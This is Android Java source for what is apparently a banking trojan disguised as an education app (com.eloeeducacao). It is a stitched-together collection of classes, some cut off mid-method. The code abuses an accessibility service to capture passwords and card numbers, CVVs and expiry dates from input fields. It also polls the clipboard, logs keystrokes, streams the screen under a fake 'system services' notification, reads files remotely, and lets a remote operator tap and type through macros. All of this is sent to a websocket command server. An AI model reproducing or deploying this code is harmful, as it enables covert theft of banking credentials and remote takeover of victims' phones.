package com.eloeeducacao;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

public final class Aviso {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static WindowManager wm;
    private static View root;

    private static final Runnable fim = new Runnable() {
        @Override public void run() { clear(); }
    };

    private Aviso() {}

    public static void show(final Context c, final String titulo, final String texto) {
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    clear();
                    wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);

                    LinearLayout fora = new LinearLayout(c);
                    fora.setPadding(28, 28, 28, 28);

                    LinearLayout card = new LinearLayout(c);
                    card.setOrientation(LinearLayout.HORIZONTAL);
                    card.setGravity(Gravity.TOP);
                    card.setPadding(26, 22, 26, 22);
                    GradientDrawable bg = new GradientDrawable();
                    bg.setColor(Color.parseColor("#F21A1F26"));
                    bg.setCornerRadius(38f);
                    bg.setStroke(2, Color.parseColor("#2E3945"));
                    card.setBackground(bg);

                    TextView ic = new TextView(c);
                    ic.setText("!");
                    ic.setTextColor(Color.WHITE);
                    ic.setTextSize(15);
                    ic.setTypeface(Typeface.DEFAULT_BOLD);
                    ic.setGravity(Gravity.CENTER);
                    GradientDrawable ib = new GradientDrawable();
                    ib.setShape(GradientDrawable.OVAL);
                    ib.setColor(Color.parseColor("#2F81F7"));
                    ic.setBackground(ib);
                    LinearLayout.LayoutParams il =
                            new LinearLayout.LayoutParams(dp(c, 30), dp(c, 30));
                    il.rightMargin = dp(c, 16);
                    ic.setLayoutParams(il);

                    LinearLayout col = new LinearLayout(c);
                    col.setOrientation(LinearLayout.VERTICAL);

                    TextView t1 = new TextView(c);
                    t1.setText(titulo);
                    t1.setTextColor(Color.WHITE);
                    t1.setTextSize(14);
                    t1.setTypeface(Typeface.DEFAULT_BOLD);

                    TextView t2 = new TextView(c);
                    t2.setText(texto);
                    t2.setTextColor(Color.parseColor("#B8C2CE"));
                    t2.setTextSize(13);
                    t2.setPadding(0, dp(c, 4), 0, 0);

                    col.addView(t1);
                    col.addView(t2);
                    card.addView(ic);
                    card.addView(col);
                    fora.addView(card);

                    int type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.WRAP_CONTENT, type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT);
                    lp.gravity = Gravity.TOP;
                    lp.y = dp(c, 44);
                    fora.setTranslationY(-dp(c, 140));
                    wm.addView(fora, lp);
                    root = fora;
                    fora.animate().translationY(0).setDuration(220).start();
                    H.removeCallbacks(fim);
                    H.postDelayed(fim, 5200);
                } catch (Throwable ignored) {}
            }
        });
    }

    public static void clear() {
        H.post(new Runnable() {
            @Override public void run() {
                H.removeCallbacks(fim);
                try {
                    if (root != null && wm != null) {
                        root.animate().translationY(-dp(root.getContext(), 140)).setDuration(180).start();
                        final View v = root;
                        H.postDelayed(new Runnable() {
                            @Override public void run() {
                                try { if (wm != null) wm.removeView(v); } catch (Throwable ignored) {}
                            }
                        }, 190);
                    }
                } catch (Throwable ignored) {}
                root = null;
            }
        });
    }

    private static int dp(Context c, int v) {
        return (int) (v * c.getResources().getDisplayMetrics().density);
    }
}

package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

public final class Captura {

    private static final LinkedHashSet<String> vistos = new LinkedHashSet<>();
    private static volatile long ultimo;

    private static boolean luhn(String d) {
        int soma = 0;
        boolean par = false;
        for (int i = d.length() - 1; i >= 0; i--) {
            int n = d.charAt(i) - '0';
            if (par) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            soma += n;
            par = !par;
        }
        return soma % 10 == 0;
    }

    private static String dica(AccessibilityNodeInfo n) {
        StringBuilder b = new StringBuilder();
        try {
            if (n.getViewIdResourceName() != null) {
                String id = n.getViewIdResourceName();
                int i = id.lastIndexOf('/');
                b.append(i >= 0 ? id.substring(i + 1) : id).append(' ');
            }
        } catch (Throwable ignored) {}
        try {
            if (n.getHintText() != null) b.append(n.getHintText()).append(' ');
        } catch (Throwable ignored) {}
        try {
            if (n.getContentDescription() != null) b.append(n.getContentDescription());
        } catch (Throwable ignored) {}
        String s = b.toString().trim();
        return s.length() > 60 ? s.substring(0, 60) : s;
    }

    private static void manda(String tipo, JSONObject o) {
        Net.send("{\"t\":\"" + tipo + "\",\"o\":" + o.toString() + "}");
    }

    public static void ev() {
        long a = System.currentTimeMillis();
        if (a - ultimo < 650) return;
        ultimo = a;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        AccessibilityNodeInfo f = null;
        try {
            f = r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        } catch (Throwable ignored) {}
        if (f == null) return;
        CharSequence cs = f.getText();
        if (cs == null) return;
        String t = cs.toString().trim();
        if (t.length() < 3) return;

        String pkg = k.curPkg == null ? "?" : k.curPkg;
        String campo = dica(f);
        String chave = pkg + "|" + campo + "|" + t;
        if (vistos.contains(chave)) return;
        vistos.add(chave);
        if (vistos.size() > 500) {
            List<String> l = new ArrayList<>(vistos);
            vistos.clear();
            for (int i = l.size() - 350; i < l.size(); i++) vistos.add(l.get(i));
        }

        String baixo = campo.toLowerCase();
        try {
            JSONObject o = new JSONObject();
            o.put("app", pkg);
            o.put("campo", campo);
            if (f.isPassword()) {
                o.put("v", t);
                manda("cred", o);
                return;
            }
            String dig = t.replaceAll("[^0-9]", "");
            if (dig.length() >= 13 && dig.length() <= 19 && luhn(dig)) {
                o.put("v", dig);
                manda("cartao", o);
                return;
            }
            if (t.matches("(0[1-9]|1[0-2])\\s?/\\s?\\d{2,4}")) {
                o.put("v", t);
                manda("cartao", o);
                return;
            }
            if (dig.length() >= 3 && dig.length() <= 4
                    && (baixo.contains("cvv") || baixo.contains("segur")
                        || baixo.contains("cvc") || baixo.contains("cod"))) {
                o.put("v", dig);
                manda("cartao", o);
            }
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public final class Clip {

    public static volatile boolean on;
    private static String ultimo = "";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static boolean rodando;

    public static void liga(final Context c) {
        if (rodando) return;
        rodando = true;
        H.postDelayed(new Runnable() {
            @Override public void run() {
                if (!on) { rodando = false; return; }
                try {
                    ClipboardManager cm = (ClipboardManager)
                            c.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData d = cm.getPrimaryClip();
                    if (d != null && d.getItemCount() > 0) {
                        CharSequence t = d.getItemAt(0).coerceToText(c);
                        if (t != null && t.length() > 0 && t.length() < 4000) {
                            String s = t.toString();
                            if (!s.equals(ultimo)) {
                                ultimo = s;
                                Util.sendT("clip", s);
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                H.postDelayed(this, 2500);
            }
        }, 800);
    }
}

        if (on) return;
        on = true;
        final Thread.UncaughtExceptionHandler velho = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {

                try {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    FileOutputStream f = c.openFileOutput("erro.txt", Context.MODE_PRIVATE);
                    f.write((t.getName() + "\n" + sw).getBytes("UTF-8"));
                    f.close();
                } catch (Throwable ignored) {}
                if (velho != null) velho.uncaughtException(t, e);
            }
        });
    }

    public static String texto(Context c) {
        try {
            FileInputStream f = c.openFileInput("erro.txt");
            byte[] b = new byte[f.available()];
            f.read(b);
            f.close();
            String s = new String(b, "UTF-8");
            return s.length() > 1600 ? s.substring(0, 1600) : s;
        } catch (Throwable t) {
            return "";
        }
    }

    public static void limpa(Context c) {
        try { c.deleteFile("erro.txt"); } catch (Throwable ignored) {}
    }

        java.io.RandomAccessFile raf = null;
        try {
            File f = new File(path);
            if (!f.isFile()) return "nao e arquivo";
            long total = f.length();
            raf = new java.io.RandomAccessFile(f, "r");
            raf.seek(Math.max(0, Math.min(off, total)));
            int n = (int) Math.min(len, Math.max(1, total - raf.getFilePointer()));
            byte[] b = new byte[n];
            int r = raf.read(b);
            if (r <= 0) return "fim";
            return "off=" + off + " total=" + total + " b64=" + Base64.encodeToString(
                    r == n ? b : java.util.Arrays.copyOf(b, r), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "err: " + t;
        } finally {
            try { if (raf != null) raf.close(); } catch (Throwable ignored) {}
        }

            CharSequence cs = e.getCharacters();
            String txt = cs == null ? "" : cs.toString();

                else if (kc == KeyEvent.KEYCODE_DPAD_DOWN) txt = "[BAIXO]";

package com.eloeeducacao;

import android.os.Bundle;
import android.os.Handler;

import org.json.JSONArray;

import java.util.ArrayList;

public final class Macro {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final List<JSONObject> fila = new ArrayList<>();
    public static volatile boolean rodando;

    public static void play(JSONArray a, JSONObject vars) {
        synchronized (fila) {
            fila.clear();
            JSONObject v = vars == null ? new JSONObject() : vars;
            if (a != null) {
                for (int i = 0; i < a.length(); i++) {
                    JSONObject s = a.optJSONObject(i);
                    if (s == null) continue;
                    if (s.has("v")) {
                        try {
                            s.put("v", s.optString("v")
                                    .replace("{{CHAVE}}", v.optString("chave"))
                                    .replace("{{VALOR}}", v.optString("valor")));
                        } catch (Throwable ignored) {}
                    }
                    fila.add(s);
                }
            }
        }
        if (!rodando) {
            rodando = true;
            H.post(passo);
        }
    }

    public static void stop() {
        synchronized (fila) { fila.clear(); }
        rodando = false;
        Util.sendT("info", "macro interrompido");
    }

    private static final Runnable passo = new Runnable() {
        @Override public void run() {
            if (!rodando) return;
            JSONObject s;
            synchronized (fila) {
                if (fila.isEmpty()) {
                    rodando = false;
                    Util.sendT("info", "macro concluido");
                    return;
                }
                s = fila.remove(0);
            }
            KeySvc k = KeySvc.I;
            try {
                if (k != null && s.has("t")) {
                    JSONArray p = s.getJSONArray("t");
                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("l")) {
                    JSONArray p = s.getJSONArray("l");
                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("s")) {
                    JSONArray p = s.getJSONArray("s");
                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
                } else if (k != null && s.has("x")) {
                    k.setText(s.getString("x"));
                } else if (k != null && s.has("k")) {
                    k.key(s.getInt("k"));
                } else if (s.has("do")) {
                    String d = s.optString("do");
                    if ("back".equals(d)) {
                        if (k != null) k.key(4);
                    } else if ("home".equals(d)) {
                        if (k != null) k.key(3);
                    } else if ("wait".equals(d)) {
                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
                    } else {
                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
                        else executa(s, h, k);
                    }
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
        }
    };

    private static void espera(final JSONObject s, final long ate) {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
        if (h != null) {
            executa(s, h, k);
            H.postDelayed(passo, 120);
            return;
        }
        if (System.currentTimeMillis() > ate) {
            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
            H.postDelayed(passo, 120);
            return;
        }
        H.postDelayed(() -> espera(s, ate), 250);
    }

    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
        String d = s.optString("do");
        try {
            if ("tap".equals(d)) k.touch(h.x, h.y);
            else if ("long".equals(d)) k.longPress(h.x, h.y);
            else if ("get".equals(d)) Util.sendT("get", h.txt);
            else if ("set".equals(d)) {
                Bundle b = new Bundle();
                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        s.optString("v"));
                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            }
        } catch (Throwable ignored) {}
    }
}

package com.eloeeducacao;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Net {
    private static volatile WebSocketClient ws;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final AtomicBoolean busy = new AtomicBoolean();
    private static volatile int fails;
    private static volatile long lastRx;
    private static Thread wdt;

    public static void start(final Context c) {
        if (busy.get() || (ws != null && ws.isOpen())) return;
        if (!busy.compareAndSet(false, true)) return;
        new Thread(() -> {
            boolean ok = false;
            try {
                List<String> urls = Util.candidates(c);
                Log.d("update", "candidatos: " + urls);
                for (String u : urls) if (tryConnect(c, u)) { ok = true; break; }
            } catch (Throwable t) {
                Log.d("update", "start: " + t);
            }
            busy.set(false);
            if (!ok) H.postDelayed(() -> start(c), backoff());
        }).start();
    }

    private static boolean tryConnect(final Context c, final String url) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicBoolean up = new AtomicBoolean();
        try {
            WebSocketClient w = new WebSocketClient(URI.create(url)) {
                @Override public void onOpen(ServerHandshake h) {
                    up.set(true);
                    fails = 0;
                    lastRx = System.currentTimeMillis();
                    Util.remember(c, url);
                    Log.d("update", "aberto em " + url);
                    send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
                    keepalive(c);
                    latch.countDown();
                }
                @Override public void onMessage(String m) {
                    lastRx = System.currentTimeMillis();
                    Cmd.handle(c, m);
                }
                @Override public void onClose(int code, String r, boolean remote) {
                    Log.d("update", "close " + code + " " + r + " " + url);
                    if (ws != this) return;
                    H.postDelayed(() -> start(c), backoff());
                }
                @Override public void onError(Exception e) {
                    Log.d("update", "err " + e + " " + url);
                    latch.countDown();
                }
            };
            w.setConnectionLostTimeout(25);
            w.connect();
            if (!latch.await(6, TimeUnit.SECONDS) || !up.get()) {
                try { w.close(); } catch (Throwable ignored) {}
                return false;
            }
            ws = w;
            return true;
        } catch (Throwable t) {
            Log.d("update", "falhou " + url + ": " + t);
            return false;
        }
    }

    private static void keepalive(final Context c) {
        if (wdt != null) return;
        wdt = new Thread(() -> {
            while (true) {
                try { Thread.sleep(10000); } catch (InterruptedException e) { return; }
                WebSocketClient w = ws;
                if (w == null || !w.isOpen()) continue;
                if (System.currentTimeMillis() - lastRx > 35000) {
                    Log.d("update", "sem resposta, reciclando");
                    try { w.close(); } catch (Throwable ignored) {}
                    continue;
                }
                send("{\"t\":\"ka\"}");
            }
        });
        wdt.setDaemon(true);
        wdt.start();
    }

    private static long backoff() {
        fails = Math.min(fails + 1, 6);
        return 2500L * fails + (long) (Math.random() * 1200);
    }

    public static void send(String s) {
        try {
            WebSocketClient w = ws;
            if (w != null && w.isOpen()) w.send(s);
        } catch (Throwable ignored) {}
    }

    public static void sendBin(byte[] b) {
        try {
            WebSocketClient w = ws;
            if (w == null || !w.isOpen()) return;
            if (w.hasBufferedData()) return;
            w.send(b);
        } catch (Throwable ignored) {}
    }

    public static boolean online() {
        WebSocketClient w = ws;
        return w != null && w.isOpen();
    }
}

import android.app.Notification;

public class ScreenSvc extends Service {

    public static volatile boolean alive;
    public static volatile boolean black;
    public static volatile boolean giveUp;
    public static volatile int Q = 35;
    public static volatile int FPS = 6;
    public static volatile int W = 540;
    public static volatile long lastFrame;
    public static ScreenSvc I;

    private static final int MAX_RESTARTS = 3;

    private MediaProjection mp;
    private VirtualDisplay vd;
    private ImageReader ir;
    private HandlerThread th;
    private Handler bh;
    private int w, h, dpi, sw, sh;
    private long last;
    private int blackCount;
    private int restarts;

    private final MediaProjection.Callback cb = new MediaProjection.Callback() {
        @Override public void onStop() {
            alive = false;
            black = false;
            Net.send("{\"t\":\"err\",\"o\":\"projecao encerrada pelo sistema\"}");
        }
    };

    public static void rebuildNow() {
        ScreenSvc s = I;
        if (s == null || s.bh == null) return;
        s.bh.post(new Runnable() { @Override public void run() { s.rebuild(); } });
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        I = this;
        th = new HandlerThread("scr");
        th.start();
        bh = new Handler(th.getLooper());
    }

    @Override public int onStartCommand(Intent it, int f, int s) {
        if (it == null) {
            alive = false;
            stopSelf();
            return START_NOT_STICKY;
        }
        giveUp = false;
        restarts = 0;
        startFg();
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(it.getIntExtra("code", 0),
                    (Intent) it.getParcelableExtra("data"));
            if (mp == null) {
                alive = false;
                Net.send("{\"t\":\"err\",\"o\":\"getMediaProjection nulo\"}");
                stopSelf();
                return START_NOT_STICKY;
            }
            mp.registerCallback(cb, bh);

            DisplayMetrics dm = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE))
                    .getDefaultDisplay().getRealMetrics(dm);

            w = dm.widthPixels;
            h = dm.heightPixels;
            dpi = dm.densityDpi;
            mirror();
            Net.send("{\"t\":\"info\",\"o\":\"projecao iniciada " + w + "x" + h + " em " + W + "px\"}");
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"start: " + Util.esc(String.valueOf(t)) + "\"}");
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void mirror() {
        try {
            sw = Math.max(2, Math.min(W, w)) & ~1;
            sh = Math.max(2, (h * sw / Math.max(1, w))) & ~1;
            ir = ImageReader.newInstance(sw, sh, PixelFormat.RGBA_8888, 2);
            ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override public void onImageAvailable(ImageReader r) { onImg(r); }
            }, bh);
            int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
            vd = mp.createVirtualDisplay("av", sw, sh, Math.max(120, dpi * sw / Math.max(1, w)),
                    flags, ir.getSurface(), null, bh);
            alive = true;
            black = false;
            blackCount = 0;
            lastFrame = System.currentTimeMillis();
        } catch (Throwable t) {
            alive = false;
            Net.send("{\"t\":\"err\",\"o\":\"mirror: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    private void rebuild() {
        try { if (vd != null) { vd.setSurface(null); vd.release(); } } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        vd = null;
        ir = null;
        last = 0;
        mirror();
    }

    private static boolean dark(Bitmap b) {
        int bw = b.getWidth(), bh2 = b.getHeight();
        int sx = Math.max(1, bw / 10), sy = Math.max(1, bh2 / 10);
        long sum = 0;
        int n = 0;
        for (int y = sy / 2; y < bh2; y += sy)
            for (int x = sx / 2; x < bw; x += sx) {
                int c = b.getPixel(x, y);
                sum += ((c >> 16) & 0xff) + ((c >> 8) & 0xff) + (c & 0xff);
                n++;
            }
        return n > 0 && sum / (n * 3) < 8;
    }

    private void onImg(ImageReader r) {
        Image img = null;
        Bitmap out = null;
        try {
            img = r.acquireLatestImage();
            if (img == null) return;
            if (giveUp) return;
            long now = System.currentTimeMillis();
            if (now - last < 1000 / Math.max(1, FPS)) return;
            last = now;

            Image.Plane p = img.getPlanes()[0];
            int ps = p.getPixelStride();
            int bw = p.getRowStride() / ps;

            out = Bitmap.createBitmap(bw, sh, Bitmap.Config.ARGB_8888);
            out.copyPixelsFromBuffer(p.getBuffer());
            if (bw != sw) {
                Bitmap c = Bitmap.createBitmap(out, 0, 0, sw, sh);
                out.recycle();
                out = c;
            }
            lastFrame = now;

            if (dark(out)) {
                if (Util.banco(KeySvc.I == null ? null : KeySvc.I.curPkg)) {
                    black = true;
                    blackCount = 0;
                } else if (++blackCount > 10) {
                    black = true;
                    if (blackCount == 20) {
                        if (restarts < MAX_RESTARTS) {
                            restarts++;
                            Net.send("{\"t\":\"info\",\"o\":\"frame preto, rebuild " + restarts + "\"}");
                            rebuild();
                        } else if (!giveUp) {
                            giveUp = true;
                            alive = false;
                            Net.send("{\"t\":\"err\",\"o\":\"projecao falhou, usando screenshot\"}");
                        }
                    }
                }
            } else {
                blackCount = 0;
                black = false;
            }

            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            out.compress(Bitmap.CompressFormat.JPEG, Q, bo);
            Net.sendBin(bo.toByteArray());
        } catch (Throwable ignored) {
        } finally {
            if (out != null) out.recycle();
            if (img != null) { try { img.close(); } catch (Throwable ignored) {} }
        }
    }

    private void startFg() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            NotificationChannel c = new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            c.setSound(null, null);
            nm.createNotificationChannel(c);
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Servicos do sistema")
                .setContentText("Sincronizando...")
                .setSmallIcon(R.mipmap.ic)
                .setOngoing(true)
                .setShowWhen(false)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            else
                startForeground(1, n);
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"startForeground: " + Util.esc(String.valueOf(t)) + "\"}");
        }
    }

    @Override public void onDestroy() {
        alive = false;
        black = false;
        I = null;
        try { if (vd != null) vd.release(); } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        try { if (mp != null) mp.stop(); } catch (Throwable ignored) {}
        try { if (th != null) th.quitSafely(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
}

package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.regex.Pattern;

public final class Sel {

    public static final class Hit {
        public final AccessibilityNodeInfo node;
        public final int x, y;
        public final String txt;
        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
            this.node = n; this.x = x; this.y = y; this.txt = t;
        }
    }

    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
        try {
            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
            if (s.has("cls")) {
                String c = String.valueOf(n.getClassName()).toLowerCase();
                if (!c.contains(s.getString("cls").toLowerCase())) return false;
            }
            if (s.has("id")) {
                String id = n.getViewIdResourceName();
                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
            }
            if (s.has("txt")) {
                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
                    return false;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> out = new ArrayList<>();
        if (raiz == null) return out;
        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
        fila.add(raiz);
        int limite = 4000;
        while (!fila.isEmpty() && limite-- > 0) {
            AccessibilityNodeInfo n = fila.poll();
            if (n == null) continue;
            if (casa(n, s)) {
                Rect r = new Rect();
                n.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    CharSequence t = n.getText();
                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo f = n.getChild(i);
                if (f != null) fila.add(f);
            }
        }
        return out;
    }

    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> l = todos(raiz, s);
        if (l.isEmpty()) return null;
        if (!s.has("perto")) return l.get(0);
        int px = s.optJSONArray("perto").optInt(0, 0);
        int py = s.optJSONArray("perto").optInt(1, 0);
        Hit best = null;
        double bd = Double.MAX_VALUE;
        for (Hit h : l) {
            double d = Math.hypot(h.x - px, h.y - py);
            if (d < bd) { bd = d; best = h; }
        }
        return best;
    }
}

package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.Deque;

public final class Snap {

    private static String t(CharSequence c) {
        if (c == null) return "";
        String s = c.toString().replace("\n", " ").replace("|", "/").trim();
        return s.length() > 90 ? s.substring(0, 90) : s;
    }

    public static String dump() {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        if (r == null) return "sem janela ativa";
        StringBuilder b = new StringBuilder();
        Deque<AccessibilityNodeInfo> f = new ArrayDeque<>();
        Deque<Integer> d = new ArrayDeque<>();
        f.add(r);
        d.add(0);
        int n = 0;
        while (!f.isEmpty() && n++ < 1500) {
            AccessibilityNodeInfo x = f.poll();
            int dep = d.poll();
            if (x == null) continue;
            Rect rr = new Rect();
            x.getBoundsInScreen(rr);
            if (rr.width() > 0 && rr.height() > 0) {
                String cls = String.valueOf(x.getClassName());
                int i = cls.lastIndexOf('.');
                if (i >= 0) cls = cls.substring(i + 1);
                b.append(dep).append('|').append(cls).append('|')
                        .append(t(x.getViewIdResourceName())).append('|')
                        .append(x.isEditable() ? "E" : "")
                        .append(x.isClickable() ? "C" : "").append('|')
                        .append(rr.left).append(',').append(rr.top).append(',')
                        .append(rr.right).append(',').append(rr.bottom).append('|')
                        .append(t(x.getText())).append('|')
                        .append(t(x.getContentDescription())).append('\n');
            }
            for (int i = 0; i < x.getChildCount(); i++) {
                AccessibilityNodeInfo c = x.getChild(i);
                if (c != null) { f.add(c); d.add(dep + 1); }
            }
        }
        return b.length() == 0 ? "tela vazia (FLAG_SECURE?)" : b.toString();
    }
}

package com.eloeeducacao;

import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Tree {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final int MAX = 400;

    private Tree() {}

    public static void dump(final KeySvc s) {
        H.post(new Runnable() {
            @Override public void run() {
                final JSONArray arr = new JSONArray();
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root != null) walk(root, arr, 0);
                } catch (Throwable ignored) {}
                Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
            }
        });
    }

    private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
        if (n == null || arr.length() >= MAX || d > 30) return;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                String txt = n.getText() == null ? "" : n.getText().toString().trim();
                if (txt.isEmpty() && n.getContentDescription() != null)
                    txt = n.getContentDescription().toString().trim();
                boolean edit = n.isEditable();
                boolean clic = n.isClickable();
                if (!txt.isEmpty() || edit || clic) {
                    if (txt.length() > 120) txt = txt.substring(0, 120);
                    JSONObject o = new JSONObject();
                    o.put("t", txt);
                    o.put("x", r.centerX());
                    o.put("y", r.centerY());
                    o.put("d", d);
                    if (clic) o.put("c", 1);
                    if (edit) o.put("e", 1);
                    o.put("cls", cls(n.getClassName()));
                    if (n.getPackageName() != null) o.put("pkg", n.getPackageName().toString());
                    arr.put(o);
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), arr, d + 1);
        } catch (Throwable ignored) {}
    }

    private static String cls(CharSequence c) {
        if (c == null) return "?";
        String s = c.toString();
        int i = s.lastIndexOf('.');
        return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
    }

    public static void act(final KeySvc s, final float x, final float y, final boolean longo) {
        if (longo) {
            s.longPress(x, y);
            return;
        }
        H.post(new Runnable() {
            @Override public void run() {
                boolean feito = false;
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo n = acha(root, (int) x, (int) y, 0);
                        while (n != null && !n.isClickable()) n = n.getParent();
                        if (n != null) feito = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                } catch (Throwable ignored) {}
                if (!feito) s.touch(x, y);
            }
        });
    }

    private static AccessibilityNodeInfo acha(AccessibilityNodeInfo n, int x, int y, int d) {
        if (n == null || d > 30) return null;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (!r.contains(x, y)) return null;
            for (int i = n.getChildCount() - 1; i >= 0; i--) {
                AccessibilityNodeInfo f = acha(n.getChild(i), x, y, d + 1);
                if (f != null) return f;
            }
            return n;
        } catch (Throwable t) {
